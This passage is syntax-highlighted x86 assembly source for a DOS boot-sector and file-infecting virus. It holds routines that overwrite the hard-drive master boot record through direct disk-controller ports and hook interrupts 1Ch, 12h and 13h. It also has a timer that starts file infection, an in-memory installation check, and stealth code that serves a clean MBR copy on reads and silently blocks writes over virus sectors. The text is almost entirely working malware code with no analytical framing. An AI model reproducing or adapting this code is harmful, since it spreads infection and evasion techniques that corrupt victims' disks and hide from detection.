                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc1">;Clear prefetch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
                </span><span class="sc1">;Jump to original entry point</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">

</span><span class="sc5">exeret</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">exe_ip</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">exe_cs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Exit program if launcher execution                                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">exit_launcher</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get .sys parameter block pointer</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc1">;Restore segment registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Use terminate program in droppers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Write hard drive mbr using direct port access                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">hd_write_port</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save some reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc1">;Get offset of write buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">        
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">

</span><span class="sc5">try_hd_port_again</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Enable disk reset (FDC)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">03F6h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">

                </span><span class="sc1">;Send drive 00h and head 00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F6h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">

                </span><span class="sc1">;Prepare drive to write at cylinder 00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F7h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wait_drive_ready</span><span class="sc0">

                </span><span class="sc1">;Check for errors on drive operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F1h</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">try_hd_port_again</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wait_drive_ready</span><span class="sc0">        

                </span><span class="sc1">;Send number of sectors to write ( 01h sector )</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F2h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">

                </span><span class="sc1">;Send sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F3h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">

                </span><span class="sc1">;Send cylinder high</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F4h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">

                </span><span class="sc1">;Send cylinder low</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F5h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">

                </span><span class="sc1">;Send drive and head</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F6h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pause_some_ms</span><span class="sc0">

                </span><span class="sc1">;Send command (write sector without retry)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F7h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wait_seek_ready</span><span class="sc0">

                </span><span class="sc1">;Send data to port ( 0100h words for 01h sector )</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F0h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">outsw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wait_drive_ready</span><span class="sc0">

</span><span class="sc5">exit_mbr_infection</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Restore regs and return</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">wait_drive_ready</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check drive-ready flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F7h</span><span class="sc0">
</span><span class="sc5">still_working</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">still_working</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">wait_seek_ready</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wait_drive_ready</span><span class="sc0">

                </span><span class="sc1">;Check if seek operation complete</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wait_seek_ready</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pause_some_ms</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc5">void_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">void_loop</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus int 1Ch handler                                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">my_int1Ch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Do not use this handler if file infection is active</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_infection_flag</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">my1Ch_exit</span><span class="sc0">

                </span><span class="sc1">;Inc virus timer counter</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_timer</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Check if time to hook dos</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_timer</span><span class="sc4">],</span><span class="sc2">0100h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_time_for_dos</span><span class="sc0">

                </span><span class="sc1">;Try to hook dos</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hook_dos</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">my1Ch_exit</span><span class="sc0">

</span><span class="sc5">not_time_for_dos</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check if time to start infecting files</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_timer</span><span class="sc4">],</span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">my1Ch_exit</span><span class="sc0">

                </span><span class="sc1">;Set file infection flag and stop virus timer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_infection_flag</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">my1Ch_exit</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Get control back to old int 1Ch</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old1Ch</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus int 12h handler                                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">my_int12h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Perform int call</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old12h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Installation check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">00BADh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_check_v</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FACEh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_check_v</span><span class="sc0">

                </span><span class="sc1">;Check if call comes from infected .com or .exe files</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">029Ah</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_from_exe_com</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hook_dos</span><span class="sc0">

</span><span class="sc5">not_from_exe_com</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Im here!!!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0DEADh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0BABEh</span><span class="sc0">
</span><span class="sc5">not_check_v</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus int 13h handler                                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">my_int13h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Hook dos on first write operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">look_mbr</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hook_dos</span><span class="sc0">
</span><span class="sc5">look_mbr</span><span class="sc4">:</span><span class="sc0">       
                </span><span class="sc1">;Check for head 00h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">

                </span><span class="sc1">;Take care about track 00h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">

                </span><span class="sc1">;Floppy or hd?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_hd_operation</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">is_floppy_operation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">

</span><span class="sc5">is_hd_operation</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check for write operations</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">hd_write</span><span class="sc0">

                </span><span class="sc1">;Check for extended write operations</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">hd_write</span><span class="sc0">

                </span><span class="sc1">;Check for read operations</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">hd_read</span><span class="sc0">

                </span><span class="sc1">;Check for extended read operations</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">hd_read</span><span class="sc0">

</span><span class="sc5">my13h_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get control back to old int 13h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Monitoring hd write operations                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">hd_write</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Trying to overwrite virus sectors?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc5">inf_sect_size</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">

                </span><span class="sc1">;Return without error</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Monitoring hd read operations                                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">hd_read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Trying to read infected mbr?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth_mbr</span><span class="sc0">

                </span><span class="sc1">;Trying to read sectors on witch virus resides?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc5">inf_sect_size</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">

                </span><span class="sc1">;Return with error</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">stealth_mbr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Redirect reads to infected mbr into the clean copy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">mbr_stealth_error</span><span class="sc0">

                </span><span class="sc1">;Decrypt mbr</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt_sector</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc5">mbr_stealth_error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Perform encryption over es:[bx] 0200h byte                                ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">crypt_sector</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

